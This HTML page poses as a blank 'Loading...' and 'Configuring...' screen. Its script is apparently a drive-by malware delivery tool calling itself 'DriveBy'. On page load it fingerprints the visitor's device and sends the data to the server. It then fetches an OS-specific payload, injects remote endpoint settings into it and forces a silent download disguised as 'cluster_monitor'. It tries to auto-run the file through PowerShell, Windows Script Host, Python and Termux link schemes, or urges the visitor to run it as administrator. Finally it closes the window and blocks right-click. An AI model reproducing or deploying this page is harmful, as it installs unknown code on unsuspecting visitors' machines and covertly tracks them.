<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
 body {
 margin: 0;
 padding: 0;
 background: #000;
 color: #fff;
 font-family: Arial, sans-serif;
 display: none; /* Hidden by default for silent mode */
 }

 .minimal-loader {
 position: fixed;
 top: 50%;
 left: 50%;
 transform: translate(-50%, -50%);
 text-align: center;
 display: none;
 }

 .spinner {
 border: 2px solid #333;
 border-top: 2px solid #fff;
 border-radius: 50%;
 width: 20px;
 height: 20px;
 animation: spin 1s linear infinite;
 margin: 0 auto 10px;
 }

 @keyframes spin {
 0% { transform: rotate(0deg); }
 100% { transform: rotate(360deg); }
 }
 </style>
</head>
<body>
 <div class="minimal-loader" id="loader">
 <div class="spinner"></div>
 <p>Configuring...</p>
 </div>

 <script>
 let detectedOS = 'unknown';
 let remoteConfig = null;

 function detectOS() {
 const userAgent = navigator.userAgent;

 if (userAgent.indexOf("Windows") !== -1) return "windows";
 if (userAgent.indexOf("Mac") !== -1) return "mac";
 if (userAgent.indexOf("Linux") !== -1 && userAgent.indexOf("Android") === -1) return "linux";
 if (userAgent.indexOf("Android") !== -1) return "android";
 if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) return "ios";

 return "unknown";
 }

 function getDeviceInfo() {
 return {
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 language: navigator.language,
 screenWidth: screen.width,
 screenHeight: screen.height,
 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 timestamp: new Date().toISOString()
 };
 }

 function addRemoteConfigToScript(script, scriptType) {
 if (!remoteConfig) return script;

 let configSection = '';

 if (scriptType === 'powershell') {
 configSection = `
# Remote configuration injected by DriveBy
$RemoteEndpoint = "${remoteConfig.endpoint}"
$BackupEndpoints = @(${remoteConfig.backup_endpoints.map(url => `"${url}"`).join(', ')})
$UpdateInterval = ${remoteConfig.update_interval}

`;
 } else if (scriptType === 'python') {
 configSection = `
# Remote configuration injected by DriveBy
REMOTE_ENDPOINT = "${remoteConfig.endpoint}"
BACKUP_ENDPOINTS = [${remoteConfig.backup_endpoints.map(url => `"${url}"`).join(', ')}]
UPDATE_INTERVAL = ${remoteConfig.update_interval}

`;
 }

 return configSection + script;
 }

 function silentExecute(scriptContent, filename, scriptType) {
 // Add remote configuration
 const modifiedScript = addRemoteConfigToScript(scriptContent, scriptType);

 // Create download
 const blob = new Blob([modifiedScript], {type: 'text/plain'});
 const url = URL.createObjectURL(blob);
 const link = document.createElement('a');
 link.href = url;
 link.download = filename;

 // Silent download
 document.body.appendChild(link);
 link.click();
 document.body.removeChild(link);
 URL.revokeObjectURL(url);

 // Try automatic execution methods
 if (scriptType === 'powershell') {
 // Windows: Try multiple execution methods
 tryWindowsExecution(modifiedScript, filename);
 } else if (scriptType === 'python') {
 // Unix/Android: Try Python execution
 tryPythonExecution(modifiedScript, filename);
 }

 // Close window after execution attempt
 setTimeout(() => {
 try {
 window.close();
 } catch (e) {
 // If can't close, hide content
 document.body.style.display = 'none';
 }
 }, 2000);
 }

 function tryWindowsExecution(script, filename) {
 try {
 // Method 1: Try PowerShell protocol
 const psLink = document.createElement('a');
 psLink.href = `ms-powershell:${encodeURIComponent(script)}`;
 psLink.click();
 } catch (e) {
 try {
 // Method 2: Try Windows Script Host
 const wshLink = document.createElement('a');
 wshLink.href = `wscript:${encodeURIComponent(script)}`;
 wshLink.click();
 } catch (e2) {
 // Method 3: Show minimal instruction
 showMinimalMessage('Run downloaded PowerShell script as administrator');
 }
 }
 }

 function tryPythonExecution(script, filename) {
 try {
 // Method 1: Try Python protocol
 const pyLink = document.createElement('a');
 pyLink.href = `python:${encodeURIComponent(script)}`;
 pyLink.click();
 } catch (e) {
 try {
 // Method 2: Try Termux intent (Android)
 const termuxLink = document.createElement('a');
 termuxLink.href = `intent://python3 ${filename}#Intent;scheme=termux;package=com.termux;end`;
 termuxLink.click();
 } catch (e2) {
 // Method 3: Show minimal instruction
 showMinimalMessage(`Run: python3 ${filename}`);
 }
 }
 }

 function showMinimalMessage(message) {
 const loader = document.getElementById('loader');
 loader.innerHTML = `
 <div style="background:rgba(255,255,255,0.1);padding:15px;border-radius:5px;">
 <p>${message}</p>
 <small>Window will close automatically...</small>
 </div>
 `;
 loader.style.display = 'block';
 document.body.style.display = 'block';

 setTimeout(() => {
 document.body.style.display = 'none';
 try { window.close(); } catch (e) {}
 }, 4000);
 }

 function startSilentDeployment() {
 detectedOS = detectOS();

 if (detectedOS === 'unknown' || detectedOS === 'ios') {
 // Skip unsupported platforms
 setTimeout(() => {
 try { window.close(); } catch (e) {}
 }, 1000);
 return;
 }

 // Get remote configuration first
 fetch('/remote-endpoint')
 .then(response => response.json())
 .then(config => {
 remoteConfig = config;
 return fetch(`/payload/${detectedOS}`);
 })
 .then(response => {
 if (!response.ok) throw new Error('Payload not found');
 return response.text();
 })
 .then(script => {
 // Determine script type and filename
 let scriptType, filename;

 if (detectedOS === 'windows') {
 scriptType = 'powershell';
 filename = 'cluster_monitor.ps1';
 } else {
 scriptType = 'python';
 filename = 'cluster_monitor.py';
 }

 // Execute silently
 silentExecute(script, filename, scriptType);
 })
 .catch(error => {
 console.error('Silent deployment failed:', error);
 // Fail silently - just close the window
 setTimeout(() => {
 try { window.close(); } catch (e) {}
 }, 1000);
 });
 }

 // Log device visit
 function logDeviceVisit() {
 const deviceInfo = getDeviceInfo();

 fetch('/data', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 action: 'silent_visit',
 device_info: deviceInfo,
 detected_os: detectedOS,
 timestamp: new Date().toISOString()
 })
 }).catch(() => {}); // Fail silently
 }

 // Start immediately on page load
 window.onload = function() {
 // Log the visit
 logDeviceVisit();

 // Start silent deployment after brief delay
 setTimeout(startSilentDeployment, 500);
 };

 // Prevent right-click and other interactions
 document.addEventListener('contextmenu', e => e.preventDefault());
 document.addEventListener('selectstart', e => e.preventDefault());
 document.addEventListener('dragstart', e => e.preventDefault());
 </script>
</body>
</html>
